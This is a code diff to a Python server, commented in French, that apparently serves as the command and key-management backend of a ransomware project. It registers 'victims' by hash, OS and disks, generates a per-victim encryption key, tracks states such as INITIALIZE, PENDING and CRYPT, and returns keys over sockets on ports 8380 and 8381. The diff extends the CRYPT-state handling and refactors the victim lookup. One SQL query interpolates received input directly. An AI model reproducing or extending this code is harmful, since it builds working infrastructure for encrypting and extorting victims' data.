@@ -49,12 +49,18 @@ def get_data_from_db(message_console, conn):
         console_thread_queue.put(message_response)
     # Traiter le message reçu de type CHGSTATE
     elif type_message == "CHGSTATE":
+        print(message_console)
         victim_id = message_console["CHGSTATE"]
+        if message_console["STATE"] == "CRYPT":
+            victim_id = data.select_data(conn, f"SELECT id_victim FROM victims WHERE hash = '{victim_id}'")[0][0]
+            items = ["id_states", "id_victim", "datetime", "state"]
+            contenu = [2, victim_id, datetime.datetime.now().timestamp(), "CRYPT"]
+            data.insert_data(conn, "states", items, contenu)
         print(victim_id)
         # récupérer l'état actuel en fonction de l'id de la victime
         history = data.get_list_history(conn, victim_id)
         print(history)
-        if len(history) > 0:
+        if len(history) > 0 and history[-1][3] != "CRYPT":
             # Récupérer le dernier état de la victime
             state = history[-1][3]
             if state == "PENDING":
@@ -78,7 +84,7 @@ def get_data_from_db(message_console, conn):
         print(hash_victim)
         found = False
         i = 0
-        for victim in victims:
+        for i, victim in enumerate(victims):
             if hash_victim == victim[0]:
                 history = data.get_list_history(conn, victim[2])
                 params = [victim[0], victim[1], history[-1][3]]
@@ -86,22 +92,16 @@ def get_data_from_db(message_console, conn):
                 front_thread_queue.put(message_response)
                 found = True
                 break
-            i += 1
-        if found:
-            pass
-            print(i)
-        else:
+        if not found:
             key = security.gen_key(512)
             items_victim = ["id_victim", "os", "hash", "disks", "key"]
-            contenu_victim = [i + 1, message_console["OS"], hash_victim, str(message_console["DISKS"]), key]
+            contenu_victim = [len(victims) + 1, message_console["OS"], hash_victim, str(message_console["DISKS"]), key]
             data.insert_data(conn, "victims", items_victim, contenu_victim)
             print(contenu_victim)
             items_state = ["id_states", "id_victim", "datetime", "state"]
             print(items_state)
-            contenu_state = [1, i + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
+            contenu_state = [1, len(victims) + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
             data.insert_data(conn, "states", items_state, contenu_state)
-
-
 
             message_response = message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"])
             print("message_response", message_response)
@@ -142,13 +142,11 @@ def handle_console(socket_server_console):
 
 
 def handle_frontal(socket_server_frontal):
-    global front_thread_queue
-    global main_queue
     print("Frontal server started")
+    client_socket, address = socket_server_frontal.accept()
+    print(client_socket, address)
+    key = security.diffie_hellman_recv_key(client_socket)
     while True:
-        client_socket, address = socket_server_frontal.accept()
-        print(client_socket, address)
-        key = security.diffie_hellman_recv_key(client_socket)
         encrypted_message_frontal = network.receive_message(client_socket)
         print("hello ii")
         if encrypted_message_frontal is not None:
@@ -166,9 +164,6 @@ def handle_frontal(socket_server_frontal):
 
 
 def main():
-    global console_thread_queue
-    global main_queue
-    global front_thread_queue
     socket_server_console = network.start_net_serv(port=8380)
     socket_server_frontal = network.start_net_serv(port=8381)
     conn = data.connect_db()
@@ -181,7 +176,6 @@ def main():
     console.start()
     frontal.start()
 
-    global main_queue
     while True:
         while not main_queue.empty():
             # Traiter les éléments de la file
